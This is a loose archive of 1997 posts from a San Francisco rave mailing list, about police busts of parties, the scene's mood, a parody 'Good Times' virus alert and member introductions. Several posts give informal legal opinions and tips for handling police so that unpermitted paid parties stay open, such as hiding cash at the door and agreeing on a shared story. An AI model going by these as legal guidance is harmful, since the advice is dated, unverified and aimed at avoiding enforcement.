</excerpt>

  Sorry, Pengo. I checked the site and I have to comment. It was well put
together. However, I completely disagree with the statement that is is
intelligent. I can think of only one intelligent or positive thing about
gang membership or the screwed up things that happen because of them. The
only 

</excerpt><<<<<<<<


I don't think the site glorifies gang membership or gang violence

I think it is an attempt to educate ignorant people who see some latino
or

asian or black youth on the street wearing certain styles of clothes 
and

posturing a certain way and immediately assuming that they are
"Gangsters".

Gangs today like those of the 20s, 30s, 40s, 50s, 60s , 70s, etc. are

organized crime units. generally but not exclusively made up of members
who share some close ties, either family, neighborhood, or ethnic.  The
larger groups are multinational "corporations" and as a result have
members of all races and classes.  Since original gangs usually come up
from neighborhoods,

as the member get older, the gang matures, the "Mob" or mafia is a mature
organization, it's origins come from sicily in the 20s, The cripts and
Bloods developed in the 70s, they are leaving the "violent" phase
somewhat and are moving into the "corporation" phase.  Most real gang
members are about their money, and making it.  If you are in their way
you could get hurt or killed.

They are not interested in chillin at Raves since that is not the music
that they prefer.


>>>>

positive I can come up with is graffiti. I do like graffiti. BUT, to
consider that I may be shot because of my warddrobe or a handshake I
share with a friend, is an indication of exactly how stupid gangs are.
This is one site, which will not be appearing on my link list, ever.

<<<<<<<<


That's a pitty cuz there is stuff on that website that could keep some of
the things that you are afraid of from happening.

>>>>

Yeah, okay, so I got way too emotional about it. I should have taken a
chill before I wrote... oopsie, next time. ;) I just never was in and
will never support gangs. As you might have guessed, I have very strong
feelings about it. I am also not interested in changing my habits or my
apparel, because of a potential mistaken association with some gang. I
already have a hard enough time deciding what to wear and how to act, in
general. ;) Furthermore, it is not now, nor will it ever be an interest
of mine to be able to tell which gangs are which or who hangs with who...
So, I prolly shoulda jus' kept mah big mouth shut... ;)


On the upside, I can appreciate the positive impact that this site is
trying to provide. AND I got some good information about graffiti.
Thanks, Geoff! :D

Just wanted to put in my $.02

this is in reply to the "busted" string

Partying...well "party's".....are very important to me and like hell if i'm gonna let the cops strong 
arm and intimidate us into throwing less of them.  I believe that they are probably thinking 
somewhere along the lines of "if we hassle them enough they'll just give up.  They're just a 
buch of punk kids without any motivation or intelligence."

I just think we have to persevere-sp? and not let them win.  If it means going more 
underground, then let it be so.  Or we really need to learn the laws that govern us so that we 
are not taken advantage of.  If we are educated and know that we have a right to assemble, 
and are following all city ordinances or laws, then there is little that they can do to stop us.

I REALLY love the scene and all of those involved in it, and would like to see it flourish.  ( in a 
non-commercial way of course).  I have put 5 yrs of my life into it and am willing to put another 
5. (well, in some capacity).

Thanks for listening,
Micron

>I've got a question for anyone who was at Eminence--  was it just me or
was there a >bad vibe going around?  I mean, you know how you can just walk
into a room and >sense a bad vibe?  Especially right at the entrance as you
first walk into the >warehouse...  Maybe it's just me, but I have noticed
that there are more and more >"thug" types hanging out at parties as the
weeks go by...  (perhaps because of the >"commercializtion" that the scene
is slowly falling into?)

Totally!!!! the vibe at Eminence was VERY scary. I did not enjoy it at all
(the vibe that is) I kept walking all over the place trying to find
somewhere with 'good vibes' but it was sooooo hard to do so. The Chill out
room was a scary place to be in, it was
dark and unfriendly. everyone was in their own selfish world and that I did
not like.
I enjoy going to parties where everyone can be in community and where
everyone
shares the best of themselves to everyone. Eminence was definitely not it.

>I remember back in the day when you could accidentally bump into someone
and >not be worried that they might take a swing at you...  just a friendly
"sorry!" and a >smile would be sufficient....

Totally...It is scary when you bump into someone and they say either "what
the fuck?!" really loud or they look at you as in a weird manner. Talk
about having
a bad trip!!... I even say "I'm so sorry," and they basically either ignore
me or
they mumble something rude. :(

>To me it appears that raves nowadays are becoming more "commercialized";
and >that more people are showing up not to dance or show unity, but
instead to "pick up >on chicks"... like it was a club or a bar or
something... 

YUP!..my friend Becca got 'cruised' a lot at Eminence. They wouldn't leave 
her alone. :( I mean..its OK to meet people at a party, but its not ok to
go
there for that only reason. To *meet* people as in a 'bad intentions'...A
lot of
people now a days go to parties for the drugs and the 'chicks' (as you 
mentioned above) that is the wrong reasons to go. 

I go to raves so that I can meet new friends, have new experiences, and
share
the best in me with everyone and make everyone happy, and listen to music,
and dance all night long (or socialize all night long). Drugs I take
because I choose to. I don't need them to survive nor do I need them to
have fun :). its kinda like
when you go to a bar, some people choose to drink, some people don't....

>Now, I'm not trying to pick on any lifestyle or any particular group, it's
just that when >I try to be friendly to someone by offering candy or a blow
pop or some water, I >expect to at least be greeted with a smile or
something... not be told, "What the >hell???  Get away..."

Totally!!! That is why I didn't give out candy at Eminence unless the
people I talked
to (no very many that night) greeted me in a good way. I mean, when I tried
to say
hi to people most of the time I got a reply in a rrruuudee tone of voice
like: 'go away' but they enver said it. kinda like 'leave us alone'. and
that disappointed me :(

>Other than that, I must say I did have fun at Eminence--  sure, Keoki
rocked the >house, but real props go out to DJ Ghost; who just intensified
my high just a little >bit more with all his killer beats...  

I did have fun also :o) Keoki did indeed have a good set... why did he stop
the
music though? he totally stopped it for like 15mins... 

Peace and Love to all!
Pab

Received: from Tommacdevitt.exploretech.com (Administrator@localhost) by exploretech.com (1.0 (Berkeley 8.7) Build 340/Configuration 4) with SMTP id RAA00063 for <sfraves@hyperreal.com>; Tue, 14 Jan 1997 17:27:49 -0800

X-Sender: cporter@exploretech.com

Mime-Version: 1.0

From: Chris Porter <cporter@exploretech.com>
Subject: busted... longish!
Sender: sfraves-owner@hyperreal.com
Precedence: bulk

Hello beautiful raver peoples,

I apologize for posting without introducing myself first, but I'm at a new
job so's I need to keep this short....ish.

  A much younger, non-raver me used to have a job that required working with
the police on a daily basis, not just any police, the Oakland Police.  For a
time an extremely naive me was going to be a cop. Ugghh!

  There are certain realities associated with  trying to stand up to the
fuzz that little to do with our civil rights.  Probable Cause is defined
very loosely in Alameda Co. especially in Oakland.  This is ostensibly
because of the "crack scourge"....damn those plumbers.  If, in the course of
my previous job, I needed a car or even a residence searched, all I needed
to do was tell an OPD (Oakland Police Dept.) officer that I believed
contraband to be in that car, or on those premises. Now this was usually at
the end of an investigation, so I had my facts straight, but still, on the
word of an ordinary citizen they will break down your door or pull you from
your car. 

 If they don't have a PR's (person reporting) complaint to manufacture
probable cause, all they have to do is say that the odor of pot is present
(whether it is or not) and they have all the probable cause they want.  I
know of several officers who would use this as an excuse they wanted to
enter a premise with out obtaining a warrant. 

Obviously, not every cop bends the rules like this, and I quit my former job
about 3 years ago, so things could have changed. 3 years ago the night shift
was so busy (under staffed) that "expediting" due process was almost a
necessity keep on top of the huge volume of calls on a weekend.  Not an
excuse, but a reality.  If a certain kind of cop wants to bust an unpermited
party, or enter a residence where he thinks something illegal is going on,
he will just do it and make up a good reason later.

Just my two cents, I got more, but I type REAL slow.

                Chris





Chris Porter                              (408)-654-3846 8:00am To 5:00pm PST.
                Customer Support                    
                Explore Technologies Inc.
                2880 Lakeside Dr, Suite 130
                Santa Clara Ca 95054

: 
: Totally...It is scary when you bump into someone and they say either
"what
: the fuck?!" really loud or they look at you as in a weird manner. Talk
: about having
: a bad trip!!... I even say "I'm so sorry," and they basically either
ignore
: me or
: they mumble something rude. :(
: 
: >To me it appears that raves nowadays are becoming more "commercialized";
: and >that more people are showing up not to dance or show unity, but
: instead to "pick up >on chicks"... like it was a club or a bar or
: something... 
: 
: YUP!..my friend Becca got 'cruised' a lot at Eminence. They wouldn't
leave 
: her alone. :( I mean..its OK to meet people at a party, but its not ok to
: go
: there for that only reason. To *meet* people as in a 'bad intentions'...A
: lot of
: people now a days go to parties for the drugs and the 'chicks' (as you 
: mentioned above) that is the wrong reasons to go. 
: 
: I go to raves so that I can meet new friends, have new experiences, and
: share
: the best in me with everyone and make everyone happy, and listen to
music,
: and dance all night long (or socialize all night long). Drugs I take
: because I choose to. I don't need them to survive nor do I need them to
: have fun :). its kinda like
: when you go to a bar, some people choose to drink, some people don't....
: 
: >Now, I'm not trying to pick on any lifestyle or any particular group,
it's
: just that when >I try to be friendly to someone by offering candy or a
blow
: pop or some water, I >expect to at least be greeted with a smile or
: something... not be told, "What the >hell???  Get away..."
: 
: Totally!!! That is why I didn't give out candy at Eminence unless the
: people I talked
: to (no very many that night) greeted me in a good way. I mean, when I
tried
: to say
: hi to people most of the time I got a reply in a rrruuudee tone of voice
: like: 'go away' but they enver said it. kinda like 'leave us alone'. and

>could either do some pro-bono or reduced rate work to find out just what

>or guessing what are fate is or should be next time we're visited by the

From sfraves-owner@hyperreal.com  Tue Jan 14 18:52:02 1997
Received: by taz.hyperreal.com (8.8.3/V2.0) id SAA29894; Tue, 14 Jan 1997 18:52:02 -0800 (PST)
Received: from mh1.well.com by taz.hyperreal.com (8.8.3/V2.0) with ESMTP id SAA29881; Tue, 14 Jan 1997 18:51:58 -0800 (PST)
Received: from [206.15.83.17] (sf2-ppp17.well.com [206.15.83.17]) by mh1.well.com (8.7.6/8.7.5) with SMTP id SAA24488; Tue, 14 Jan 1997 18:51:12 -0800 (PST)
X-Sender: leftjab@mail.well.com
Message-Id: <v01510101af01f7b7b982@[206.15.69.15]>
Mime-Version: 1.0
Content-Type: text/plain; charset="us-ascii"
Date: Tue, 14 Jan 1997 20:05:54 -0800
To: sfraves@hyperreal.com
From: leftjab@well.com (leftjab)
Subject: legal research; observations
Cc: sfr-legal@saturn5.com
Sender: sfraves-owner@hyperreal.com
Precedence: bulk

        A number of people have mentioned more formally determining what
our rights are, and I am willing to research this issue and/or help out
whatever civil rights attorney who might agree to assist us (in case you
just joined us, I formally "came out" to sfr as an attorney a week or two
ago).  I'm not a civil rights attorney myself, but I'm confident I can at
least determine the municipal and possibly state laws that are relevant.
I'm in a weird period of my life right now -- I'm going away this weekend
for a week to visit my parents and have to prepare for the trip, and
meanwhile I have a job interview this week, one when I get back, and I have
to clean out my current office (my job ends this week).  I'm pretty sure
that I'll be hired when I return and have to hit the ground running.  In
other words, don't expect the Bay Area Raver Legal Guide for at least a
couple of weeks  ;)

        I intend on initially focusing my research on SF and Oakland, and
relevant California laws; Berkeley, San Jose, and other locales will come
soon enough.  I've gained a little more insight into the excuses the police
use to bust parties the last couple of days, and I thank Dave Bayer for
giving a good account of the Resolution 5 closing.  The following seems to
me to be a good list of issues:

        Business permits -- what constitutes a "business;" how can a party
that wants to charge people get away with it if cops arrive (invitations,
pre-sale tix only, donations?)

[As an aside about Resolution 5, my sense is that because the entry door
was open and it was probably visible that the people were taking money just
inside, the cops do have the right to then demand a permit from the owner,
and then shut down the party if one isn't provided.  There is a "plain
view" exception to the warrant requirement for a search of a house (i.e.,
if a cop sees you breaking a law inside a house, he doesn't need a warrant
for a search).  But just hearing music loudly shouldn't rise to the level
of that exception.]

        Fire codes -- how many people per square foot, numbers of exits, etc.

        Noise restrictions -- what decibel level at how many feet outside
the party; reasonable neighbor complaints.  Wouldn't it be great if there
were a noise complaint, and then you could go x feet from the house with a
decibel meter and prove to the cop it wasn't too loud (or, wouldn't it suck
if there's no legal way to have a party with even a little volume unless
there was enough soundproofing to silence an airplane)?

        Other Health & Safety -- need for insurance and security, "social
host" laws (what happens if your guests take drugs at your party and then
crash into someone while driving home under the influence)

        Dealing with the Authorities -- what to do when the cops show up.
Wayne's advice is exactly what I've heard -- speak with the cops outside
the space, with the doors shut, and in a calm, civil and reasoned tone,
explain everthing you need to make them understand there's nothing to worry
about (private party, only x people, we'll keep it down for any noise
complaints, no sarcastic humor if the cop asks about drugs).  If memory
serves, Tony Rotundo posted last month about how he successfully dealt with
cops outside the WOMO party, and it was pretty much along those lines.  One
other possibility, if the cops are patently unreasonable, and there are
plenty of willing, non-drug-carrying volunteers who plan to do this in
advance if needed, is passive civil disobedience -- sit down, refuse to
move, and let them carry you out and arrest you for disobeying their
illegal orders to leave. This category should also cover when search
warrants are necessary.

        If anyone else can come up with more topics, I'll try to explore
them as well.  Please please please send me any information you might have
on the above topics -- if anyone knows ANYTHING about, say, SF business
permits, even if it's just the number of a statute, it will make things
easier.

        The obvious caveat is that knowing your rights isn't always enough.
If the jerk cop Dave posted about was frustrated by succesful people at
the door giving him answers that wouldn't allow him to legally enter, who
knows whether he would have found a way to enter the house and shut the
party down, illegal or not.  I want to be proactive, so we can be legal and
avoid confrontations, but often rights are protected only after they are
violated.  Rogue cops can really hurt our scene, because it takes a lot of
money and energy to redress illegal activity upon the part of the police.
The police know this -- and yes, it's exacerbated by the drug use in the
scene, which makes people willing to forfeit their right to party in order
not to have to confront the police.  The more we know, though, the more
likely we are to avoid this scenario.

leftjab

p.s.  my web access and knowledge of hyperreal archives is lame, but I
wonder if there has been any general work on (to paraphrase a bad 80's
song) "the Politics of Dancing."  If so, this would be a good start to my
research, and I'd love to know.

p.p.s. just saw chris porter's post about the OPD ... a cop still should
need a search warrant or an exception to search a residence, although
someone's statement that he believes there to be contraband in a residence
could convince a judge to issue the warrant (it shouldn't be an exception
to the warrant requirement, like seeing a crime in plain view). But the
point is, the cop breaks the rules, busts a party and arrests people, and
then those people's lawyers have to explain that the search was illegal and
none of the evidence can be used against those charged.  By then, it costs
us money, energy, and time, let alone parties.

At 8:05 PM -0800 1/14/97, leftjab wrote:

>        Noise restrictions -- what decibel level at how many feet outside
>the party; reasonable neighbor complaints.  Wouldn't it be great if there
>were a noise complaint, and then you could go x feet from the house with a
>decibel meter and prove to the cop it wasn't too loud (or, wouldn't it suck
>if there's no legal way to have a party with even a little volume unless
>there was enough soundproofing to silence an airplane)?
>

We (the JL) did a party a couple years back where there were neighbor
complaints regarding noise levels and the SFPD came to check it out. They
were very friendly and we turned the sound down to a level acceptable to
them (and I assume legally acceptable). However, they remarked that even
though they were ok with the noise level if they were to receive a second
complaint they'd be required to shut down the party nonetheless.

Joe

To: leftjab@well.com (leftjab), sfraves@hyperreal.com
From: Tony Rotundo <tony@xinet.com>

Cc: sfr-legal@saturn5.com

Precedence: bulk

At 4:05 AM -0000 1/15/97, leftjab wrote:
>complaints, no sarcastic humor if the cop asks about drugs).  If memory
>serves, Tony Rotundo posted last month about how he successfully dealt with
>cops outside the WOMO party, and it was pretty much along those lines.  One

Thanks LJ!  Here's my limited experience.  I'm pretty much one for one with
the long arm.  They are really good at putting words into your mouth, and
talking in circles.  (Like the:  "So what drugs are inside...")  The
absolute best things I think you can do are these:

1)  Have no money what-so-ever near the door, or even a price on the ticket.

2)  Get your story straight in your head and everyone elses head.  If you
say it's a free party, make sure someone else doesn't say it cost a dollar
(trust me!  =).  If you say it's donations, make sure everyone says it's
donations.  Mixed messages=lying, and that blows your pitch out the window.

3)  Have a clear-headed representative, and that person should come right
out, introduce themself and ask how they can help.

4)  Cooperate.

5)  When cooperating fails, beg.  =)

6)  Have as much of the truth on your side as possible.  That is, for WOMO,
my friend WAS moving his software company into the new space, and it WAS
his moving in party.  That helped.  I could look Tim (the officer) in the
eye and say, "This is a FREE party for our software company that is moving
in."  Looking left and right at the crowd of people from a busted party
nearby that were swarming the door as he approached Tim replied, "These
people don't look like software types to me." I just shrugged and said,
"They all came from a party that was broken up down the street, and they
think there's a party here."  He asked the address, we shook hands and he
split.  Never to be seen again.  [Actually, I was certain a swarm of cops
was on its way, but they never came.  In that event, we were going to keep
the door closed and just not open it..."Okay everyone, you are not allowed
to leave!  Everyone parties until dawn!  Wo-who!"]

One other point, the whole, "I'm gonna be a tough guy and not open the door
to them, etc," is very, very difficult to pull off.  I tell you, when they
come walking up and you know the balance of the party is in your every word
and action, it's a fast fucking lesson in nerve control, ya dig.

Here's an important point:   You need to make a fast judgement as to
whether you fight or fully cooperate.  If you make a stand at the door,
then right there you are saying that you are going to make it difficult.
You don't want to throw that trump too early.  You don't want to be all
brazen and surly right up front.  Feel the cop out, and then decide if
he/she should do a walk through or not...

If you know you're breaking the law (600 people), be nice and as
cooperative as possible.  If you're at a small house party, then I'd be
more apt to take a stand.

Out!

Tone

>At 8:05 PM -0800 1/14/97, leftjab wrote:
>
>>        Noise restrictions -- what decibel level at how many feet outside
>>the party; reasonable neighbor complaints.  Wouldn't it be great if there
>>were a noise complaint, and then you could go x feet from the house with a
>>decibel meter and prove to the cop it wasn't too loud (or, wouldn't it suck
>>if there's no legal way to have a party with even a little volume unless
>>there was enough soundproofing to silence an airplane)?
>>
>
>We (the JL) did a party a couple years back where there were neighbor
>complaints regarding noise levels and the SFPD came to check it out. They
>were very friendly and we turned the sound down to a level acceptable to
>them (and I assume legally acceptable). However, they remarked that even
>though they were ok with the noise level if they were to receive a second
>complaint they'd be required to shut down the party nonetheless.
>
>Joe

Legit neighbor complaints are one thing -- they always will be heeded by
the police.  But having the police on their own accord shut down a party
without neighbor complaints because they think it's too loud is another
(not that I know that this HAS happened).  I'm also thinking about the
potential excuses that rival parties might use to bust other parties --
someone finds out about a party they want to bust, and then they could
complain to the cops about noise even if they aren't in the neighborhood.
It would be great in the latter two circumstances to have a legal defense
on the spot, if possible --  my example was more wishful thinking.  I threw
this in because I'm pretty sure that official local noice restrictions are
based on decibel measurements in addition to complaints -- but I'll find
out for sure, won't I, now that I've publicly committed to doing this ...

leftjab

From sfraves-owner@hyperreal.com  Tue Jan 14 22:00:03 1997

Hi folks!  =)

 First off I would like to congratulate Steve, Jonathen and all the others 
who are involved in this project. It really warms the subversive cockles 
of my heart. (you figure out what that meant! ;)

 Talking to whats-his-nose from Acme, he was saying something to the 
effect on Art Galleries or Art Shows have some sort of special waiver or 
conditions concerning public gatherings. I really don't have any details 
(sorry!) but I also seem to recall the fire marshall as stating as long 
as there were less than 33 people he didn't care at all what was going 
on. (this was during an Acme bust)

 I realise this info may be of no use but on the chance it might I wanted 
to pass it on. Please keep up the good work gang!!

 Oh yeah! I know as certain DJ out there is a laywer. I highly encourage 
him to get involved in this project if he hasn't already. You KNOW who 
you are buddy! Thanks for the tape!


hugz,

This one hitz even closer to home.



http://www.triax.com/vlfradio/natradio.htm


Content-Type: text/html; charset=3Dus-ascii; name=3D"natradio.htm"

Content-Transfer-Encoding: 7bit

Content-Disposition: inline; filename=3D"natradio.htm"

Content-Base: "http://www.triax.com/vlfradio/natradio.htm"


<center>  <bold><bigger><bigger>

</bigger></bigger></bold></center><bold><bigger><bigger>Welcome to the
Realm of Natural VLF Radio (0.2 - 11 kHz)</bigger></bigger></bold>


 =20

 VLF listening site in the Black Rock Desert, Nevada, 22 September
1996.  WR-4B VLF vertical whip antenna is attached to van on its rear
door.  This is the VLF receiving system and expedition "accomodation" I
have used for the past 4 years.<bold><bigger>

Q: What Is Natural Radio? </bigger></bold>


 <bold>A: Natural VLF Radio - also called "Natural Radio" - are
audio-frequency radio signals of Earth in the approximately 200 Hz to
beyond 10,000 Hz (10 kHz) spectrum which are not man-made but occur
naturally in nature. Most of the best phenomena are heard between 400
Hz and 5 kHz.</bold> =20

 <bold>Many people who are not really "radio nuts" or "techies" but who
love nature have listened to Natural Radio either live or recorded and
have called it the "music of Earth itself." To listen and enjoy Natural
Radio, the audio-frequency radio waves must be converted directly to
sound via a receiver like the commercially available
<<http://www.triax.com/vlfradio/natradio.htmwr3e.htm> WR-3E.</bold> =20

 <bold>Lightning storms, Earth's magnetic-field (the Magnetosphere),
and the Aurora Borealis and Australis (Northern & Southern Lights) all
produce an amazing variety of electromagnetic "sounds," such as
<italic>sferics</italic> (lightning-stroke static), tweeks,
<italic>Whistlers</italic> of countless variety, the incredible
<italic>"Chorus</italic>" chirping, barking and squawking sounds
produced by the the Sun's solar-wind hitting Earth's magnetic-field,
various kinds of <italic>"Hiss,"</italic> and other endless variety of
fascinating radio emissions.</bold>

 <bold>Natural VLF radio signals tell a great deal of what is happening
with Earth's "near-space weather," that is, what is going on between
the Sun and Earth. Invisible weather to our eyes but just as wild and
stormy at times as the weather "down here!"</bold> =20

 <bold>Learn more about Natural Radio sounds via the Links below. It's
radio unlike what you've ever heard before...</bold>  <bold><bigger>

=46urther reading and LISTENING to learn more about Natural
Radio:</bigger></bold>

 <bold><bigger>

<<http://www.triax.com/vlfradio/natradio.htmsndbites.htm> SOUNDBITES:
MORE great 1996 (April-September) recordings in .WAV format. Most 8-bit
11 kHz</bigger></bold>

<bold><bigger>

<<http://www.triax.com/vlfradio/natradio.htmvlfsound.htm> Description
of Natural Radio "Sounds" to be heard </bigger></bold>

<bold><bigger>

<<http://www.triax.com/vlfradio/natradio.htmwr3gde.htm> WR-3 & WR-3E
VLF Receiver Listening Guide A good source to learn more, and how you
can listen yourself! </bigger></bold>

<bold><bigger>

The <<http://www.triax.com/vlfradio/natradio.htmvlfstory.htm> VLF Story
(Entire document - more info. below on this)</bigger></bold>

<bold><bigger>

<<http://www.triax.com/vlfradio/natradio.htmmb96log.htm> 1996 SOLAR
MINUMUM Expedition to Manitoba, Canada. This report also includes
detailed descriptions, PHOTOGRAPHS of the nightly displays of the
Northern Lights I viewed while there, AND AUDIO SOUND-BITES in .WAV
format.</bigger></bold>

<bold><bigger>

Download and listen to Natural Radio recordings in .WAV file format I
have placed at the University of Iowa Plasma Wave Physics web site.
<<http://www-pw.physics.uiowa.edu/mcgreevy> McGreevy Ground-based VLF
Recordings. </bigger></bold>

<bold><bigger>

<<http://www.triax.com/vlfradio/natradio.htmwr3e.htm> Buy a Natural VLF
Receiver and LISTEN for yourself to live VLF radio sounds! Receiver
sales proceeds help me to fund ongoing VLF recording expeditions and
research! </bigger></bold>

 <bold><bigger>

On the Art of NDB DXING by Sheldon Remongton. A Book on how to DX the
longwave beacons from 190 - 521 kHz (more info below, or click
hyperlink to go to <<http://www.netcom.com/~spmcgrvy/artoftoc.html>
TABLE OF CONTENTS). </bigger></bold>

om/vlfradio/natradio.htmmore.htm>

>>
>>
>>***   The Goodtimes Email Virus  ***
>>
>>Goodtimes will re-write your hard drive. Not only that, but
>>it will scramble any disks that are even close to your
>>computer. It will recalibrate your refrigerator's coolness
>>setting so all your ice cream goes melty. It will
>>demagnetize the strips on all your credit cards, screw up
>>the tracking on your television and use subspace field
>>harmonics to scratch any CD's you try to play.
>>
>>It will give your ex-girlfriend your new phone number. It
>>will mix Kool-aid into your fishtank. It will drink all your
>>beer and leave its socks out on the coffee table when
>>there's company coming over. It will put a dead kitten in
>>the back pocket of your good suit pants and hide your car
>>keys when you are late for work.
>>
>>Goodtimes will make you fall in love with a penguin. It will
>>give you nightmares about circus midgets. It will pour sugar
>>in your gas tank and shave off both your eyebrows while
>>dating your current girlfriend behind your back and billing
>>the dinner and hotel room to your Visa card.
>>
>>It moves your car randomly around parking lots so you can't
>>find it.  It will kick your dog. It will leave libidinous
>>messages on your boss's voice mail in your voice! It is
>>insidious and subtle. It is dangerous and terrifying to
>>behold. It is also a rather interesting shade of mauve.
>>
>>Goodtimes will give you Dutch Elm disease. It will leave the
>>toilet seat up. It will make a batch of Methamphetamine in
>>your bathtub and then leave bacon cooking on the stove while
>>it goes out to chase gradeschoolers with your new
>>snowblower.
>>
>>That is all.  Consider yourselves warned.
>>
>>

Hey all :)
My friend from LA sent me this from the so-calraves list and asked me to 
pass it on.. Hope you enjoy it! Have a great rest of the week and (if 
tix are left) see you at Harmony! If not, see you at F8! And the 
afterparty on Sunday of course :)
Love and hugs,
LAra


LOVE

Love is one of the most powerful forces of nature, yet it cannot be 
completely described or explained by humankind and "modern" science.

To understand love, you must feel it.

With love being such a special thing, why does the world neglect it so 
much? Imageine if a stranger were to approach you in a store to tell you 
that he or she loved you?  How would you react?

Guess What?  That person really isn't a stranger!  That person is your 
brother or sister! Don't be afraid to open your heart!

One thing this world needs is more LOVE!

We must learn to stop questioning people's intentions.  This is a 
"programmed" habit that will only lead to a dangerous circle of negativity.

Love remains one of the only things that cannot be bought or sold in this 
world.  Love is something that cannot be taken, Love must be given.  Love 
must be shared.

Love is thinking of others before you think of yourself.  To love is to 
be selfless.  To love is to make the welfare of others more important 
than your own.

Love can save this planet. At our celebrations, the amount of love in the 
air is overwhelming and intoxicating.  We must not let the love stop when 
the music stops.

Let love thrive! Carry it into the world.  Share it with the world!

Love is something that can't even be explained by words!

Love -- Feel it, share it, give it.

So now it's time to go, and live LOVE!

Precedence: bulk

hi all:

this is the last i have to say on the matter.  yes, i did read the entire
joke, and yes, i knew the note was a joke before i sent out my nastygram.
my inbox is full of people telling me how they thought the virus alert thing
was funny.  yes, i thought it was funny, the first time i saw it, then i saw
it a dozen more times.  

and then somebody on a [different] mailing list to whom this joke was
propagated DIDN'T read the entire message -- just the first paragraph -- and
forwarded it onto one of their friends, informing them of a new virus, etc. etc.

the long and short of it is that sooner or later, somebody thinks it's a
real virus -- YES, YES, i KNOW it's obvious that it's not, but somebody
always does, and it's a pain in the butt to have to explain over and over
and over again that it isn't.

spreading a virus hoax (even an obvious one) should be like discussing
airplane hijackings in an airport.  if nothing else, it's bad karma.

p.


_____________________________________________________ x-radio _____
_______ http://www.x-radio.com/ ___________________________________

The Good Times virus is indeed a hoax.

However, it's sadly no longer entirely true that e-mail can't carry =

viruses.  For example, if you have a mailer on the PC configured to =

automatically launch Word when you get a doc file attatchment, then you =

could be at risk from Word macro visuses.

Apologies accepted.  But do you REALLY think that someone is going to be
MORE likely to go to your site if you stuff it with 20 or so emails instead
of just one?!?  Have you ever heard of SPAMMING?  That's just what you did,
and if you haven't figured it out yet, its considered poor use of the net.

I have a better suggestion -- instead of just posting 20+ messages with
"visit my site, visit my site, visit my site" why not tell more about your
site in the first message -- like some of the different cool things, etc.?
That's what I do when we update our junglism site (www.cyberzen.com/jungle)
every week.

It got pretty annoying after the first ten or so :(

Words are powerful.  Use them judiciously and their impact will be far
greater :)

>     wrong,and sends you a bill for $4,500.

From sfraves-owner@hyperreal.com  Wed Jan 15 11:06:44 1997
Received: by taz.hyperreal.com (8.8.3/V2.0) id LAA13035; Wed, 15 Jan 1997 11:06:44 -0800 (PST)

Message-Id: <2.2.32.19970115190908.00f6d984@sdic.net>
X-Sender: robot@sdic.net

Subject: introductions and NYE pictures...
Sender: sfraves-owner@hyperreal.com
Precedence: bulk


Hello all,

I thought I'd introduce myself since there was a call for lurkers to come
forward.  I'm a South Peninsula boy, born and raised (well actually born in
SJ Hospital but raised in Mtn. View/Cupertino/Los Altos).  That makes me a
suburban freak but that's okay the way I see it.  At least I had hills and
orchards to play in when I was younger.

Anyway, I'm currently a Computer Science student at UC San Diego and I very
much miss partying with all the wonderful people up in SF.  I guess you
could call me an old-timer since I have been around for so long.  I went to
the first Toon Town (It was for Preston's B-Day if I remember correctly). I
went to the first Full Moon Massive on Baker Beach (practically the DAY Jeno
came to town).  I heard Garth spin out for the first time EVER!  I remember
when the ONLY place to hear decent dance music was Osmosis at the top floor
of DV8 and Watch It Wiggle, See It Jiggle by SF's own Doc Martin (did you
know he was originally from SF?).  I even remember when Townsend opened for
the first time and Doc Martin (who played Hip-Hop at the time) and Pete
Avila started playing there (YIKES!)  I remember when Wicked was an after
2am basement acid house party at Big Heart City Cafe and Toon Town was every
Saturday night at 650 Howard St.  I actually did a bit of DJing in the South
Bay with Spun, Rick Preston and others.  I played at the Destiny Parties
which formed with Community and Eklypz to become the first Gathering (which
reminds me that I ALSO went to Martin's first parties, Eklypz and Peices).

Ah well, that was long ago and things have GREATLY changed.  The Wicked boys
no longer play techno and acid (it's all house now).  The Hardkisses barely
get booked in SF (rember Sunny Side up?).  The Flop House is no more and Goa
Gill is worshipped by little Goa heads all over the world.  The only thing
that HASN'T changed is that Martin STILL throws the only bust-free parties
in the Bay Area.  Please don't feel as though I'm trying to brag, I just
wanted to share a bit of old memories with others on the list I KNOW where
there too (Andy...).

As you can probably figure out, I'm a little older than the average raver
but I can still loose my head as I did on NYE at the Pacific/Gateway party.
I swear I haven't become soft and sunk into the house disease I think many
other old-timers have.  I'm mad about techno and my posts will probably
reflect my deep love for it.  I don't spin anymore as it's a game better
played by those with more dedication than I can give (props out to folks
like MAD, Pacific, Gateway and others who are behind bringing the techno
back to SF).  I do dabble a bit with music making but haven't released
anything (I'm pretty anal about my own material and I'm waiting until I'm
good enough to be heard).  My latest bit of fun is building my own analog
synths which I am now fully prepared to go out and accomplish as I've
repaired some of my own gear and built some kit projects.

So that's it about myself for now.  As a warning, I can come off pretty
stong but it's just my passion for the music coming out.  I'll try and not
stir up too much trouble as I did on socal-raves when I was subscribed.

Here's a little New Years photo spread from the Gateway/Pacific Party and
Stompy Cafe on New Years Day.

http://icse1.ucsd.edu/~rcurlee/new-years/

I hope you enjoy!
                   _
-robert           | |___   ____   ____ _____
                  | |_  \ / -__/ /  _/ |  _ \     __________
                  |_____/ \___\  |_|   | |__/    / -studio- \
_________________________________      |_|
http://icse1.ucsd.edu/~rcurlee/  \

WARNING: NON-RAVE RELATED MATERIAL FOLLOWS!

Seems to me that humor on this list is like playing Gin
while waiting for the call to action.  We entertain ourselves,
keeping the contacts alive and the feeling of family
warm while waiting for the next rave to begin...

As long as we're entertaining each other:

> Top Ten Reasons why the Strar Trek Universe Kicks Bigger butt on Star
> Wars.
> 
> 10. C-3PO gets confused, Data gets laid.
> 
> 9.  On the Falcon, the crew plays "chess" on the Enterprise, the crew
> goes to the holodeck--- and gets laid.
> 
> 8.  In Star Wars they went to cantina and got in trouble, in Star TRek
> they went to Risa, and got laid.
> 
> 7.  Riker kissed Dianna, Luke kissed his sister.
> 
> 6.  Star Trek had a chick Borg with a removable head. Need I say more?
> 
> 5.  Riker is obbsessed with sleeping with every alien he encounters.
> 
> 4.  Wookies?
> 
> 3.  Luke needs a lightsaber to cut someone in half, Worf just uses a big
> knife.
> 
> 2.  The Emperor tried to wine and dine Luke to the Dark Side of the
> Force, the Borg said screw that and just assimilated Picard.
> 
> 1.  Though Vader wears all black, he couldn't sneak up on anyone due to
> his incessant breathing.

Hello!

Sorry, I have been busy as of late, but here is my intro:

I moved to SF last week from Ft. Lauderdale, Florida. I just graduated
college
and got a job doing development of web applications.

I am really into music.  I play guitar in my spare time, and most of my
influences are
those that use a lot of distortion and fast drum machines (Ministry,
KMFDM, Filter, NIN)
Industrial is my favorite type of music, mostly because I like having it
on in the background
to make me work faster and it gets me pumped up.

